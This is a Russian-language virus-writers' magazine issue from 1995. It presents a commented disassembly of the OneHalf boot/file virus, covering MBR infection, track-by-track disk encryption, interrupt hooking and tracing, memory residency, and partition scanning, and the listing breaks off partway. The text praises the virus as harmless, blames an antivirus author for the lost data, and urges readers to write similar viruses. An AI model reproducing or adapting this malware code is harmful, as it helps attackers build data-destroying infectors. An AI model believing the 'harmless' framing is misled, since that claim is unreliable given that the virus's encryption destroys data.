 
          ▄▄                  █
         ▀▀▀ Monthly Magazine █ For VirMakers.                  FEB '95
 	 ▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀  ██▀▀▀██
	  ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ █▄▄   ██ ▀▀██
	   █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █   █     ████ ██
	   █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄  ██▄▄▄██
	   ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄
	     Copyright , (C),1994-95, by STEALTH group, unLtd.
	     (M)ail: BOX 10, KIEV 148, The CUNTry of fUcKRAINE

 ---------------------------------------------------------------------------- 
       OneHalf. Вирус, вызвавший массовую эпидемию в совке, а в особенности
 на Украине и в Киеве осенью-зимой 1994-95 года. 

              Безобидный вирус.  Проявление состоит в шифровании последнего
 логического диска с конца до его седьмой дорожки. При наличии вируса в памя-
 ти корректно обрабатывает зашифрованные места. По достижению зашифровки
 половины диска может вывести надпись, но делает это крайне редко (на каждой
 четной зараженной машине, если день кратен 4 и в зависимости от таймера.)
 Операции шифровки производит вызовом INT 13h, расположенном ниже 1го MCB.
       Шифрование диска можно отнести к методу проявления, которое я бы назвал
 АКТИВНОЙ ЗАЩИТОЙ.  Вред наносится нападающему: если убить вирус, то мертвой
 окажется и приличная часть диска, причем вирус не предпринимает попыток выну-
 дить пользователя это сделать,-  он мирно сосуществует с системой до тех пор,
 пока его право на жизнь не будет нарушено. По-моему, подлостью тут и не пах-
 нет.
       Происхождение вируса неизвестно, но ходят слухи, что он был написан в
 Англии. На его несоветское происхождение указывает строка антивирусов, в 
 которой отсутствуют WEB'ы, ADinf'ы и Aidstest'ы, что затруднило его распрост-
 ранение, однако не сильно.
      Эпидемия вируса OneHalf сопровождалась массовым уничтожением информации.
 Пострадали в основном пользователи антивируса Dr.WEB версии до 1.6 включитель-
 но,- последней версии на то время, когда бушевала эпидемия, - единственного 
 антивируса, убивавшего OneHalf.
	     Г-н Данилов не потрудился включить в свое изделие восстановление
 зашифрованной части диска. Вирус удалялся с машины, и, следовательно, больше
 некому было обрабатывать (расшифровывать при обращении) зашифрованные сектора.
 OneHalf же несправедливо обвинили в деструктивных функциях, а некомпетентность
 г-на Данилова была замолчана. Может быть он хотя бы принесет извинения всем
 пострадавшим, среди которых оказались и члены Stealth group, хотя в цивилизо-
 ванной стране от миллионных убытков, нанесенных таким вот "лечением" просто
 извинениями отделаться было бы весьма трудно. 

      При попадании на машину происходит заражение MBR. Далее заражаются файлы
 только на дискетах. Машина уже заражена и нет смысла заражать все файлы на
 ней, необходимо распространяться на другие машины - через дискеты. Возьмите
 на заметку !
      Скрывает свою длину, за исключением проверки CHKDSK.
      Значение Total Memory в Norton'е уменьшается.
	При шифровании диска счетчик зашифрованных дорожек хранится в MBR и
 обновляется при каждой загрузке, что существенно демаскирует вирус - он может
 стать жертвой ADinf'а или Virus Warning'а в BIOS'е. Virus Warning не снимает.

	Можно долго рассказывать об OneHalf, но предлагаю вам один раз  
 увидеть. Я уверен, вы получите массу удовольствия, читая откомментированный
 листинг этого высокопрофессионально написанного вируса. Данный листинг можно
 назвать энциклопедией вирмэйкера: процедуры трассировки прерывания, обслужи-
 вания зашифрованных секторов, работы с диском, проверки типа диска, обслужи-
 вание посадки в память, получение случайного числа и многое многое другое.

        Вперед, друзья, и пусть ваши вирусы будут такими же крутыми !!!

 Disclaimers: - Приносим извинения за возможные мелкие неточности в коде.
  	      - Листинг не подлежит рекомпиляции.
	      - Листинг начинается с основной части, 10 пятен, в которых 
	        содержится полиморфная процедура расшифровщика.
		(См. дрозофиллу.)

;██████████████████████████████████████████████████████████████████████████
;██					                                 ██
;██			ONEHALF	   (MCE-03544)                           ██
;██									 ██
;██     Comments by (C) LovinGOD and Populizer, 1995, STEALTH group.	 ██
;██	(&) With the little help of Eternal Maverick.			 ██
;██   	Disasmed using  Sourcer v5.04. 					 ██
;██ 					                                 ██
;██████████████████████████████████████████████████████████████████████████


	main_ram_size_	equ	413h
	timer_low_	equ	46Ch
			org	0

	В начале содержится MCB, используемое при захвате блока памяти

0000	5A  01 9F 00 FF 00 00 00 43 4F 4D 4D 41 4E 44 00
 	 └ последний блок памяти  │
	    └──сегмент владельца  │
	       на самого себя     └───────- "COMMAND"

	ЕХЕ-заголовок зараженного файла. (Для COM файла ничего не значат)
        /xref 0950/

0010  db  E9,C4,07,90,90,90
0016  dw  0000h          ; число перемещаемых элементов     /xref 04FC/
      dw  9090h
001A  dw  9090h		 ; Минимальное кол-во памяти, которое необходимо 
			 ; выделить после конца EXE         /xref 02F6/
001C  dw  9090h		 ; Макс. кол-во памяти
001E  dw  9090h		 ; значение SS          	    /xref 0550/
0020  dw  9090h		 ; значение SP
0022  db  00 		 ; Тип зараженного файла: 0=COM,1=EXE;
						       /xref 0966,0978/
      db  90h
0024  dw  0100h		 ; IP оригинала
0026  dw  FFF0h          ; CS оригинала
0028  dw  C590h          ; смещение в файле первого Relocating элемента
						           /xref 04EC/

	  Таблица смещений пятен в файле
002A  dw  0E90,0E71,0F1B,0D75,0D75,0CFF,0FBA,10CB,0F9F,0EE1

003E  dw  0822h		 ; точка входа в основное тело
0040  db  100 dup(Program's_Flesh)    ; содержимое пятен до заражения

00A4  Multi10	dw	10h	; множитель
00A6  Divi30	dw	1Eh	; множитель	     
00A8  Multi200	dw	200h	; множитель

==============================================================================

	    NewMBRstart:	; Hовое начало зараженного MBR

7C00 00AA   33 DB	xor bx,bx
7C02 00AC   FA		cli			; Ставим стек на 0000:7C00
7C03 00AD   BC 7C00	mov sp,7C00h
7C06 00B0   8E D3	mov ss,bx
7C08 00B2   FB		sti
7C09 00B3   8E DB 	mov ds,bx		; откусываем 4 Кб памяти
			sub word ptr ds:[0413h],4
7C10 00BA   B1 06	mov cl,06		;
7C12 00BC   CD 12	int 12h			; Имеем в AX=число Кб памяти
7C14 00BE   D3 E0	shl ax,cl		; Сколько в параграфах
						; Считываем себя в RAM
7C16 00C0   BA 0080	mov dx,80h		; =винчестер сторона=0
     00C3		mov es,ax		; =от "несуществующей" RAM
     00C5		mov cx,0033h		;
			       ^^^^		; /xref 0474/ местонахождение
						; тела на диске
7C1E 00C8   B8 0207	mov ax,0207h		; читаем свое тело(7 секторов)
7C21 00CB   06		push es			; Для RETF
7C22 00CC   CD 13	int 13h
7C24 00CE   B8 00D3	mov ax,0d3h		; точка продолжения выполнения
						; в откушенной памяти
 	                			; D3 служит также признаком
						; заражения MBR  /xref 03DC/
7C27 00D1   50		push ax			; В стек для RETF
7C28 00D2   CB      	retf			; ...В откушенную память

==========================================================================
7С29        dw  ????	; Записывается В MBR - нижняя граница зашифрованного
			; диска (номер дорожки). Диск шифруется с конца.
			  /xref 048E/
==========================================================================
; 	Выполняется в выделенной памяти  /xref 7C28/

00D3    8C 0E 0086	mov	ds:0086,cs	; Hаш сегмент - в вектор INT21
00D7    A1 046C		mov	ax,ds:046C	; Получаем от Таймера
00DA    1E		push	ds
00DB    0E		push	cs
00DC    1F		pop	ds
00DD    A3 056A		mov	ds:056Ah,ax	; значение таймера для ...

00E0    8C C8		mov	ax,cs		
00E2    40		inc	ax   		    ; Сегмент MCB + 1 !
00E3    A3 0001		mov	word ptr ds:[1],ax  ; Сегмент владельца-сам
00E6    C6 06 0CEB 00	mov	byte ptr ds:0CEB,0  ; откр.стрелку JMP SHORT
						    ; для процедуры замены
				; блока, откушенного бутовым методом, на нор-
				; мально выделенный с MCB (происходит при за-
				; пуске с файла)

00EB    E8 011B		call	DoublePart  	; дублируем часть вируса

00EE    07		pop	es	    	; 0000
00EF    8B DC		mov	bx,sp
00F1    06		push	es
00F2    26: 8B 77 29	mov	si,es:[bx+29h]  ; Hижняя зашифрованная дорожка
00F6    81 FE 01A1	cmp	si,01A1h	; Достигла ли шифровка
				   ^^^^		; начала диска + 7 дорожек
						; /xref044D/
	               ;(FAT и пр.ДРМ - на первых семи дорожках - не трогаем!)

00FA    76 58		jbe	CryptOut      ;(0154) не надо больше шифровать 

		       ;Шифрование еще двух дорожек диска

00FC    56		push	si
00FD    83 EE 02	sub	si,2	    ; отнимем у школьников еще две
  					    ; данные им на обед дорожки
0100    89 36 0140	mov	ds:0140,si  ; новая нижняя граница
0104    5E		pop	si
0105    B4 08		mov	ah,8
0107    CD 13		int	13h       ; получить параметры винта
				          ; bl=тип cx=дорож/сек,dh=макс.гол.
				          ; es:di=указатель на таблицу парам.
0109  72 49		jc	CryptOut  ; (0154) Ошибка -отменить шифрование

010B  8A C1		mov	al,cl
010D  24 3F		and	al,3Fh
010F  A2 0E2D		mov	ds:0E2D,al   ; сохраняем число секторов

0112  B1 01		mov	cl,1
0114  B7 7E		mov	bh,7Eh
0116  89 1E 0E2F 	mov	ds:0E2F,bx   ; буфер для шифруемых дорожек
011A  B2 80		mov	dl,80h       

			Процесс шифрования
011C		TrackCrypt:
011C  4E		dec	si	     ; номер дорожки
011D  E8 00F6		call	AllocTrackNumber ; /0216/ разместить SI по
					     ; форме в регистрах
0120  52		push	dx		
0121		loc_0121:		     ; продолжаем шифровать
0121  B4 02		mov	ah,2
0123  50		push	ax
0124  CD 13		int	13h	     ; читаем всю дорожку

0126  58		pop	ax
0127  72 09		jc	loc_0132	; обработка ошибки
0129  E8 0CFD		call	SecCrypt	; (0E29) шифруем сектора
012C  FE C4		inc	ah		; теперь 02+1=03 - запись
012E  50		push	ax
012F  CD 13		int	13h		; write sectors from es:bx
						; al=#,ch=cyl,cl=sectr,dh=head
0131  58		pop	ax		; AL=Число_секторов AH=02
0132		loc_0132:
0132  72 75		jc	loc_10		; обработка ошибки
0134  F6 C6 3F		test	dh,3Fh		; головка = 0 ?
0137  74 04		jz	loc_013D	; конец обработки этой дорожки
0139  FE CE		dec	dh		; следующая головка
013B  EB E4		jmp	short loc_0121	; продолжаем
013D		loc_013D:
013D  5A		pop	dx
013E  81 FE 032A	cmp	si,032Ah
				   ^^^^		; /xref0100/- нижняя граница
						; шифрования
0142  77 D8		ja	TrackCrypt	; продолжим
0144		UpdateCrypt:			; /xref01CE/

			; Заносим в MBR новый номер дорожки - нижней границы
			; Таким образом, MBR меняется при каждой перезагрузке.

0144 ·B7 7C		mov 	bh,7Ch
0146  26: 89 77 29	mov   	es:[bx+29h],si	; 7С29h
014A  B8 0301		mov   	ax,301h
014D  B9 0001		mov   	cx,1
0150  8A F5		mov   	dh,ch
0152  CD 13		int   	13h		; Перезапишем MBR с новым зна-
						; чением нижней границы шифро-
						; вания
		loc_0154:    			; /xref 00FA,0109/

0154  89 36 0EEE        mov	 ds:0EEEh,si    ; нижняя граница шифрования
0158  81 FE 0269        cmp	 si,0269h  
				    ^^^^	; половина диска?  /xref0467/
015C  77 03		ja	 loc_015C
015E  E8 0109		call 	 OutText	; /026A/ "Dis is one half ?"

0161		loc_015C:			; Чтение оригинального MBR
0161  B8 0201		mov	 ax,201h
0164 ·BB 7C00		mov	 bx,7C00h
0167  8B 0E 00C6	mov	 cx,ds:[00C6h]  ; сектор начала вируса
016B  49		dec	 cx             ; За один сектор до тела
						; вируса - оригинальный MBR
016C  BA 0080		mov	 dx,80h		
016F  CD 13		int	 13h

	; Установка прерываний 1С, 13 и переход на нормальную загрузку
	; 1C будет отслеживать появление DOS'а для его перехвата

0171  FA		    cli
0172  26: C4 06 004C	    les	ax,dword ptr es:004C	; INT 13 address
0177  A3 0F35		    mov	ds:[0F35h],ax	 ; сохраняем адрес
017A  8C 06 0F37	    mov	ds:[0F37h],es
017E  07		    pop	 es
017F  06		    push es
0180  26: C4 06 0070	    les	ax,dword ptr es:0070h    ; адрес INT 1C
0185  A3 0205		    mov	ds:0205,ax	 ; Cохраняем INT 1C адрес
0188  8C 06 0207	    mov	ds:0207,es	 ; (зачем,неясно)
018C  07		    pop	  es
018D  06		    push  es
018E  26: C7 06 004C 0E45   mov	word ptr es:004Ch,0E45h	; установка 13 и 1C
0195  26: 8C 0E 004E	    mov	word ptr es:004Ch+2,cs	;
019A  26: C7 06 0070 01D1   mov	word ptr es:0070h,1D1h	;
01A1  26: 8C 0E 0072	    mov	word ptr es:0070h+2,cs	;
01A6  FB		    sti
01A7  53		    push	bx    ; =7C00h
01A8  CB		    retf	      ; переход на нормальную загрузку

				=== при ошибке записи зашифрованных секторов

01A9		loc_10:				;  /xref0132/
01A9  32 E4		xor	ah,ah		
01AB  50		push	ax
01AC  CD 13		int	13h		;  Сброс диска
01AE  58		pop	ax
01AF		NxtHead:			;  /xref 01CA/
01AF ·FE C6		inc	dh
01B1  8A E6		mov	ah,dh
01B3  5A		pop	dx		;  /xref 0120/
01B4  52		push	dx
01B5  3A E6		cmp	ah,dh		; MaxHeads > CurrentHead
01B7  77 13		ja	TrackDone	; (01CC)
						; допустимая головка
01B9  8A F4		mov	dh,ah		; читаем дорожку
01BB  B4 02		mov	ah,2
01BD  50		push	ax
01BE  CD 13		int	13h

01C0  58		pop	ax
01C1  E8 0C65		call	SecCrypt	; (0E29) шифруем
01C4  FE C4		inc	ah
01C6  50		push	ax
01C7  CD 13		int	13h		; пишем
01C9  58		pop	ax
01CA  EB E3		jmp	short NxtHead	; (01AF) то же со следующей
						; головкой
				== головка не существует
01CC		TrackDone:			;  /xref01B7/
01CC  5A		pop	dx
01CD  46		inc	si		; дорожку на диске не трогали,
						; вернем счетчик обратно
01CE  E9 FF73		jmp	UpdateCrypt	; (0144) прекратим попытки
						; шифрования


     ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ INT 1C HANDLER ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄

== Перехват DOS'а по его появлению. Происходит, если вектор DOS устанавливают
== на сегмент, меньший 800h

01D1  50		push	ax
01D2  1E		push	ds
01D3  06		push	es
01D4  33 C0	  	xor	ax,ax			; обнуляем DS
01D6  8E D8		mov	ds,ax
01D8  C4 06 0084	les	ax,dword ptr ds:0084
01DC  2E: A3 0DE8	mov	cs:0DE8,ax		; сохр.смещ. DOS INT
01E0  8C C0		mov	ax,es
01E2  3D 0800		cmp	ax,800h
01E5  77 1A		ja	Exit1C			; Выход,если
							; DOS сег.> 800h
01E7  2E: A3 0DEA	mov	word ptr cs:0DEAh,ax	; сохраним и сегмент
							; найденного DOS
01EB  2E: C4 06 0205	les	ax,dword ptr cs:[205h]	;
01F0  A3 0070		mov	ds:0070h,ax		; ориг.вектор 1C назад
01F3  8C 06 0072	mov	ds:0072h,es		;
01F7  C7 06 0084 0C5D	mov	word ptr ds:0084h,0C5Dh ; перехват DOS на себя
01FD  8C 0E 0086	mov	word ptr ds:0086h,cs    
0201		     Exit1C:
0201  07		pop	es
0202  1F		pop	ds
0203  58		pop	ax
0204  EA		db	0EAh		      ; jmp far original Int1C
0205  FF53 F000		dw	0FF53h, 0F000h

============================================================================
  DoublePart proc near	 	/xref 032B,00EB/
				; Дублирование части вируса за его тело

0209  BE 0772			mov	si,0772h
020C  BF 0DD8			mov	di,0dd8h  ;  место сразу за вирусом
020F  B9 015D			mov	cx,15Dh
0212  FC			cld
0213  F3/ A4			rep	movsb
0215  C3			retn
				DoublePart  ENDP


;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
    AllocTrackNumber PROC             /xref 011D/
;   Entry: SI=номер дорожки для шифрования 
;   Result:
			    F      8 7      0	
			    |||||||| |||||||| 
				││││ └──CH──┘    
				││││	
				││76     0 CL (младшие 6 бит - сектор)
			        ││└┴┴┴┴┴┴┘    
				76     0 DH   (младшие 6 бит - головка)
			        └┴┴┴┴┴┴┘   
 ;  Процедура размещает 8-12 биты номера дорожки в CL и DH.
 ;  Для большого номера дорожки недостаточно 8 бит, не вмещающиеся биты
 ;  8-12 располагаются в CL и DH

0216  50		push	ax
0217  8B C6		mov	ax,si
0219  8A E8		mov	ch,al		
021B  51		push	cx		
021C  B1 04		mov	cl,4		; выделяем биты 8-12	
021E  D2 E4		shl	ah,cl		 	
0220  59		pop	cx
0221  B0 3F		mov	al,3Fh		; обнуляем  биты 6,7 DH,CL	
0223  22 F0		and	dh,al			
0225  22 C8		and	cl,al		
0227  F6 D0		not	al		; маска		
0229  50		push	ax
022A  22 E0		and	ah,al		; выделить 11,12 биты
022C  0A F4		or	dh,ah		; поместить их в DH(биты6,7)
022E  58		pop	ax		
022F  D0 E4		shl	ah,1				
0231  D0 E4		shl	ah,1	
0233  22 E0		and	ah,al
0235  0A CC		or	cl,ah		; поместить биты 9,10 в CL
0237  58		pop	ax
0238  C3		retn

         AllocTrackNumber  ENDP

;=============================================================================
0239  	  db	'Dis is one half.',0Dh, 0Ah			
	  db    'Press any key to continue ...', 0Dh,0Ah

;=============================================================================
;         Процедура Вывода фразы на экран в зависимости от таймера
;	  Условия активации:  день кратен 4,
;			      счетчик заражений машин содержит четное число
;			      и зашифровано не менее OneHalf диска.
;         /xref015E/
;         Скорее вы увидите как цветут кактусы, чем эту надпись.

	  Outtext  PROC NEAR

026A  B4 04	       mov	ah,4
026C  CD 1A	       int	1Ah	       ; Получить  cx=year, dx=mon/day
           				       ; работает на машинах с энерго-
					       ; независимыми часами
026E  72 24		jc	ExitOutText    ; выход по ошибке
0270  F6 C2 03		test	dl,3	       ; кратность дня
0273  75 1F		jnz	ExitOutText    
0275  F7 06 0DD6 0001	test	word ptr ds:0DD6h,1 ; четное заражение MBR ?
027B  75 17		jnz	ExitOutText

027D  B9 0031		mov	cx,31h		; длина текста
0280  BE 0239		mov	si,239h		; адрес текстового сообщения
0283  B4 0F		mov	ah,0Fh
0285  CD 10		int	10h		; получить текущий видеорежим

0287  B3 07		mov	bl,7
0289  B4 0E		mov	ah,0Eh
028B			WriProgr:		; /xref028E/
028B  AC		lodsb
028C  CD 10		int	10h
028E  E2 FB		loop	WriProgr	; пишем

0290  32 E4		xor	ah,ah	     ;  Vor Aussteigen Knopf Drucken !
0292  CD 16		int	16h

0294			ExitOutText:
0294  C3		retn
			Outtext ENDP

;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;     Вызов DOS при старте из EXE файла для считывания релокейшн тэйбл
;     и ее настройки         /xref  04F2,0512,0531/

		CallDOS	proc	near
0295  53		push	bx
0296  BB 0000		mov	bx,0
         ^^^^				; сюда заносится хендл один раз
0299  CD 21		int	21h
029B  5B		pop	bx	; а регистр BX свободен для других
					; целей
029C  C3		retn
		CallDOS		endp

;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;                              SUBROUTINE
;	  Вызов оригинального INT 13h
;         Called from:   /03C5, 03F2, 0416, 0478, 0496/
;▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
	    Int13Call	proc	near
 029D  9C		pushf
 029E  FA		cli
 029F  9A		db	9Ah
 02A0  0774 0070	dw	774h, 70h	; адрес оригинального INT 13
						; сначала заносится из табли-
						; цы векторов, затем вычисля-
						; ется трассировкой
 02A4  C3		retn
	    Int13Call	endp

 ;==========================================================================
   INT 01 HANDLER	/трассировка INT 13 до попадания ниже 1го MCB/

 02A5  55 			push  bp
 02A6  8B EC  			mov   bp,sp
 02A8  EB 23			jmp short ($+2) или TraceOff
	  ^^ 			; стрелка, будет указывать на выход после
				; завершения трассировки  
 02AA  81 7E 04 5F 0B 		cmp   word ptr [bp+4],0B5Fh
	        ^^^^^		; сюда заносится адрес 1го MCB
 02AF  77 20			ja ExitTrace

 02B1  50 53 1E 		push ax bx ds
 02B4  C5 46 02			lds ax,[bp+2]
 02B7  BB 96 D7 		mov bx,0D796h
 02BA  2E 89 87	A0 02 		cs: mov [bx][02A0h],ax
 02BF  2E 8C 9F A2 02		cs: mov [bx][02A2h],ds
 02C4  2E C6 87 A9 02 23	cs: mov [bx][02A9h],23h  ; закрыть стрелку
 02C9  1F 5B 58			pop ds bx ax
			TraceOff:
 02CC  80 66 07 FE		and [bp+07],0FEh   ; сбросить флаг трассировки
 02D1			ExitTrace:
 02D1  5D			pop	bp
 02D2  CF			iret

  ;==========================================================================
		== Инсталляция вируса в память при запуске из файла

02D3			loc_18:			;  /xref 043E/
02D3 ·5B			pop	bx      ; начало вируса
02D4  58			pop	ax      ; сегмент программы с вирусом
02D5  50			push	ax
02D6  48			dec	ax      ; MCB программы с вирусом
02D7  8E D8			mov	ds,ax
02D9  80 3E 0000 5A		cmp	byte ptr ds:[0000],5Ah	
02DE  75 6C			jne	loc_20	; не последний блок

	; выполняется, если программа-носитель занимает последний блок

 02E0  03 06 0003		add	ax,ds:0003   ; размер текущего блока
						     ; в парагафах	
 02E4  2D 00FF			sub	ax,0FFh	     ; минус около 4 кБ
 02E7  8C CA			mov	dx,cs
 02E9  8B F3			mov	si,bx	     ; начало вируса
 02EB  B1 04			mov	cl,4
 02ED  D3 EE			shr	si,cl	     ; 	/16
 02EF  03 D6			add	dx,si	     ; CS+параграфов_программы
 02F1  2E: 8B B7 001A		mov	si,word ptr cs:[1Ah][bx]
						     ; Mин.обьем памяти, к-рую
					      ; нужно выделить после конца EXE
 02F6  81 FE 0106		cmp	si,0106h
 02FA  73 03			jae	loc_19
 02FC ·BE 0106			mov	si,0106h     ; как минимум, 0106h
 02FF			loc_19:			     ; /xref 02FA/
 02FF  03 D6			add	dx,si	     ;
 0301  3B C2			cmp	ax,dx	     ; конец памяти минус 4Кб
						     ; должен быть больше,
						     ; чем CS+РазмерПрограммы
						     ; (в параграфах) 	
 0303  72 47			jb	loc_20	     ; не хватит памяти

 0305  C6 06 0000 4D		mov	byte ptr ds:0000,4Dh
					       ; теперь это HЕ последний блок
 030A  81 2E 0003 0100		sub	word ptr ds:0003,100h
					       ; стал на 100h парагафов меньше
 0310  A3 0012			mov	ds:0012,ax   ; новый MemTop для PSP

	== поселяемся в новый блок
 0313  8E C0			mov	es,ax
 0315  0E			push	cs
 0316  1F			pop	ds
 0317  40			inc	ax
 0318  A3 0001			mov	word ptr ds:[0001],ax
					; сегмент владельца - на себя
					; Заметьте - не на свой MCB, а +1 !!!

 031B  C6 87 0BAB EB		mov	byte ptr ds:[0BABh][bx],0EBh
				; код JMP SHORT

 0320  8B F3			mov	si,bx		; качаем вирус вверх
 0322  33 FF			xor	di,di
 0324  B9 0DD8			mov	cx,0DD8h
 0327  F3/ A4			rep	movsb

 0329  06			push	es
 032A  1F			pop	ds
 032B  E8 FEDB			call	DoublePart  ;(0209) 

			== Переустановка INT 21h на HашСег:0C5Dh

 032E  33 C0			xor	ax,ax
 0330  8E D8			mov	ds,ax
 0332  FA			cli
 0333  A1 0084			mov	ax,ds:0084h
 0336  26: A3 0DE8		mov	es:0DE8h,ax
 033A  A1 0086			mov	ax,word ptr ds:0084h+2
 033D  26: A3 0DEA		mov	es:0DEAh,ax
 0341  C7 06 0084 0C5D		mov	word ptr ds:0084h,0C5Dh
 0347  8C 06 0086		mov	word ptr ds:0086h+2,es
 034B  FB			sti
 034C			loc_20:			    ; /xref 02DE, 0303/
 034C  E9 014D			jmp	CureInRAM   ; (049C)


▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
      ТОЧКА ВХОДА ФАЙЛОВОЙ ЧАСТИ  (после пятен)

 034F  E8 00 00		call    $+3
 0352  5E		pop	si
 0353  81 EE 0352	sub	si,352h                 ; начало тела вируса
 0357  89 B4 02B8	mov	ds:02B8[si],si		; сохраним для...
 035B  06		push	es			;
 035C  56		push	si			;
 035D  FC		cld
 035E  FF 84 0DD6	inc	word ptr ds:0DD6[si]	; Счетчик заражений
 0362  C6 84 0BAB 74	mov	byte ptr ds:0BAB[si],74h ; ставим код "JE"
 0367  33 C0		xor	ax,ax
 0369  8E C0		mov	es,ax
 036B  26: A1 046C	mov	ax,es:timer_low_	; берем от таймера
 036F  89 84 056A	mov	ds:056A[si],ax	 	; для процедуры RND
 0373  89 84 07D1	mov	ds:07D1[si],ax
 0377  B8 4B53		mov	ax,4B53h		; проверка на наличие
 037A  CD 21		int	21h			; себя в памяти
 037C  3D 454B		cmp	ax,454Bh
 037F  74 62		je	loc_21			; мы уже есть в памяти
							; передаем управление
							; носителю
 0381  B4 52		mov	ah,52h
 0383  CD 21		int	21h			; ES:BX=List of Lists
 0385  26: 8B 47 FE	mov	ax,es:[bx-2]		; первый MCB
 0389  89 84 02AD	mov	ds:02AD[si],ax		; сохраним
 038D  C6 84 02A9 00	mov	byte ptr ds:02A9[si],0	; откроем стрелку для 
							; трассировщика
 0392  B8 3501		mov	ax,3501h
 0395  CD 21		int	21h			; получаем вектор 01
 0397  53		push	bx
 0398  06		push	es
 0399  B8 3513		mov	ax,3513h
 039C  CD 21		int	21h			; получаем вектор 13
 039E  89 9C 02A0	mov	ds:02A0[si],bx		; сохраняем текущий 13
 03A2  8C 84 02A2	mov	ds:02A2[si],es		; для вызовов 13го
 03A6  B8 2501		mov	ax,2501h
 03A9 ·8D 94 02A5	lea	dx,02A5[si]		; установим INT 01
 03AD  CD 21		int	21h

== Читаем MBR и одновременно трассируем 13 прерывание

 03AF  8D 9C 0DD8	lea	bx,cs:[0DD8h][si]	; читать за тело вируса
 03B3  B9 0001		mov	cx,1			; сек=1 цил=0
 03B6  BA 0080		mov	dx,80h			; гол=0 винт
 03B9  0E		push	cs
 03BA  07		pop	es			; читать в наш сегмент
 03BB  9C		pushf				; установка TF
 03BC  58		pop	ax
 03BD  80 CC 01		or	ah,1
 03C0  50		push	ax
 03C1  9D		popf
 03C2  B8 0201		mov	ax,201h
 03C5  E8 FED5		call	Int13Call		; /029D/ читаем MBR

 03C8  9C		pushf				; сброс TraceFlag
 03C9  58		pop	ax
 03CA  80 E4 FE		and	ah,0FEh
 03CD  50		push	ax
 03CE  9D		popf				
 03CF  1F		pop	ds			; ds:dx = старый 01
 03D0  5A		pop	dx
 03D1  9C		pushf				; возврат старого 01
 03D2  B8 2501		mov	ax,2501h
 03D5  CD 21		int	21h			;
 03D7  9D		popf
 03D8  72 64		jc	loc_25
							; MBR считан успешно
 03DA  0E		push	cs
 03DB  1F		pop	ds
 03DC  81 7F 25 00D3	cmp	word ptr [bx+25h],0D3h  ; заражен ли он нами
 03E1  75 03		jne	loc_22			;
 03E3		loc_21:					; /xref 037F/
 03E3  E9 00B5		jmp	loc_27			; лечим в памяти и ...
 03E6		loc_22:					;  /xref 03E1/

 03E6  81 BF 0180 072E  cmp    word ptr ds:[180h][bx],72Eh	
 03EC  74 50		je     loc_25	          	; не хочет с кем-то 
							; конфликтовать
 03EE  B4 08		mov	ah,8
 03F0  B2 80		mov	dl,80h
 03F2  E8 FEA8		call	Int13Call		; (029D) Получить
							; параметры диска
 03F5  72 47		jc	loc_25			;
 03F7  83 E1 3F		and	cx,3Fh			; число макс секторов
 03FA  88 8C 0814	mov	byte ptr ds:[814h][si],cl	; пригодится
 03FE  88 8C 089E	mov	byte ptr ds:[89Eh][si],cl	; и сюда один
 0402  80 E6 3F		and	dh,3Fh			        ; макс головок
 0405  88 B4 08A7	mov	byte ptr ds:[8A7h][si],dh	; прячем

		== читаем оригинальный MBR
 0409  B8 0301		mov	ax,301h
 040C  80 E9 07		sub	cl,7		; за 7 секторов до MaxSECS
 040F  88 8C 0819	mov	byte ptr ds:[819h][si],cl
 0413  BA 0080		mov	dx,80h
 0416  E8 FE84		call	Int13Call		; (029D)
 0419  72 23		jc	loc_25

	== сканируем таблицу разделов. Hаходим последний диск, который и будет
	== шифроваться, вычислим его начало, конец, и конечно, середину
 041B  51		push	cx
 041C  52		push	dx
 041D  56		push	si
 041E  87 FE		xchg	di,si
 0420  B9 0004		mov	cx,4
 0423 ·81 C3 01EE	add	bx,1EEh		; конец partition table
 0427		ScanPartitn:			; /xref 0439/
 0427  8A 47 04		mov	al,[bx+4]	; Принадлежность к системе
 042A  3C 01		cmp	al,1		; DOS с FAT12 (подходит)
 042C  74 13		je	loc_26
 042E  3C 04		cmp	al,4
 0430  72 04		jb	loc_24		; 0   = неизвестный,
						; 2,3 = Xenix      - не надо!
 0432  3C 06		cmp	al,6
 0434  76 0B		jbe	loc_26		; 4 = DOS FAT16
						; 5 = расширение DOS
						; 6 = BigDOS	  - подходят
 0436		loc_24:				;  /xref 0430/
 0436  83 EB 10		sub	bx,10h
